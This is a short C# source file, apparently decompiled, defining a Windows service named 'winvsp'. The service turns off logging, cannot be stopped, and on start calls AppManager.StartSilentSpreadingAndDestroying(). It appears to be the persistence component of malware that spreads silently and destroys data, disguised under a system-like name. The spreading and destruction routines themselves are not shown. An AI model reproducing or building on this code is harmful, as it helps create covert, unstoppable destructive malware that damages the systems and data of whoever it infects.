using System.ComponentModel;
using System.ServiceProcess;

namespace TRM.Service;

internal class TheService : ServiceBase
{
	private IContainer components;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((ServiceBase)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((ServiceBase)this).set_AutoLog(false);
		((ServiceBase)this).set_CanStop(false);
		((ServiceBase)this).set_ServiceName("winvsp");
	}

	public TheService()
	{
		InitializeComponent();
	}

	protected override void OnStart(string[] args)
	{
		AppManager.StartSilentSpreadingAndDestroying();
	}

	protected override void OnStop()
	{
	}
}
